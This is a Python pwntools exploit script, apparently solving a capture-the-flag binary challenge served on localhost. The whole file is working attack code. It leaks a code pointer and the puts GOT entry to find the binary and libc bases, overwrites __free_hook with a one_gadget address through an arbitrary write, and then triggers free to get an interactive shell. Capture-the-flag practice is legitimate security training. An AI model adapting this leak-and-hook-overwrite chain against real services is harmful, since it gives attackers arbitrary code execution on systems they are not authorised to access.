from pwn import *
from binascii import unhexlify

HOST = "localhost"
PORT = 9000

PROMPT_ALLOC_OFFSET = 0x12d2
ELF_PUTS_GOT_OFFSET = 0x3f90
__ONE_GADGET_OFFSET = 0xe3b01

LIBC_PATH = "../attachments/libc-2.31.so"

def extract_loc(line):
	return int(line.rpartition(b" ")[-1][:-1], 16)

def init(r):
	r.recvuntil(b"name: ")
	r.sendline(b"h")
	r.recvuntil(b"(max 32): ")
	r.sendline(b"32")
	return extract_loc(r.recvline())

def offset(r, offset: int):
	o = str(offset).encode()
	r.recvuntil(b"choose offset: ")
	r.sendline(o)
	r.recvline()
	return extract_loc(r.recvline())
	
def operation(r, op: str, w=None):
	r.recvuntil(b"result? ")
	r.sendline(op.encode())
	read = ""
	if op == "r":
		read = r.recvline()
	elif op == "w":
		r.sendline(w)
	else:
		return "", 0
	return read, extract_loc(r.recvline())

r = remote(HOST, PORT)
# Retrieve base location on stack
base_ptr = init(r)

# Leak prompt_alloc_size instruction address
offset(r, 0)
pas_hexleak, curr_ptr = operation(r, "r")
pas_leak = int.from_bytes(unhexlify(pas_hexleak[16:32]), 'little')
print(f"leaked prompt_alloc_size instr address {hex(pas_leak)}")

# Calculate bin base address
base_addr = pas_leak - PROMPT_ALLOC_OFFSET
print(f"got base address {hex(base_addr)}")

# Leak puts value in .got
curr_ptr = offset(r, base_addr + ELF_PUTS_GOT_OFFSET - base_ptr)
print(f"pointing to puts@got.plt at {hex(curr_ptr)}")
puts_hexleak, curr_ptr = operation(r, "r")
puts_leak = int.from_bytes(unhexlify(puts_hexleak[:16]), 'little')
print(f"puts@got.plt value is {hex(puts_leak)}")

# Calculate libc base address
l = ELF(LIBC_PATH)
l.address = puts_leak - l.sym["puts"]
print(f"free hook is at {hex(l.sym['__free_hook'])}")

# Overwrite free hook value with one gadget address
curr_ptr = offset(r, l.sym["__free_hook"] - base_ptr)
og_addr = l.address + __ONE_GADGET_OFFSET
operation(r, "w", p64(og_addr))
print(f"overwritten free_hook at {hex(curr_ptr)} with {hex(og_addr)}")

# Execute free function, pop a shell
offset(r, 0)
operation(r, "p")
r.interactive()
